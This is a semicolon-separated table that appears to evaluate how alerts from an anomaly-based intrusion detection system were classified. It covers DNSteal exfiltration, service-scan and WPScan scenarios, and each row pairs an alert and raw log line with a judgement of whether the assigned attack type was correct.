AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
DNSteal;6;"Command and Control,
Data Exfiltration";"IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,
Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”";Classification probably based on tool name dnsmasq and high entropy in DNS domain;Correct & expressive
DNSteal;1;"Reconnaissance,
Network Scanning";"IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”,
Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org [IP]”";Classification probably based on high frequency of DNS A queries;Incorrect
Service Scans;3;"Brute Force,
Account Access";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.130.77”";Classification probably based on unsuccessful imap login without auth atempts;Alternate explanation for alert
Service Scans;4;Reconnaissance;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “no host name found for IP address [IP]”";Classification probably based on repeated unsuccessful hostname resolving for same IP;Too generic
Service Scans;2;"Web Attack,
Exploitation Attempt";"IDS: “New event type”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/html/”";Classification probably based on attempted access to web base directory;Too generic
Service Scans;1;"Network Evasion,
Exploitation Attempt";"IDS: “New event type”, “New path(es) detected”,
Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”";Classification probably based on protocol name TLS and unexpected TLS packet;Too generic
Service Scans;4;"Reconnaissance,
Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”";Classification probably based on tool name nmap and 403 error;Correct & expressive
Service Scans;1;"Reconnaissance, 
Access Attempt";"IDS: “New status code in Apache Access log.”, “New value(s) detected”, 
Raw Data: “GET / HTTP/1.0 403 363 - - ”";Classification probably based on http status code 403;Too generic
Service Scans;5;"Reconnaissance,
Web Attack";"IDS: “New event type”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/html/HNAP1\”";Classification probably based on  repeated unsuccessful access to web root directory;Too generic
WPScan;1;"Reconnaissance,
Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and http status code 403;Correct & expressive
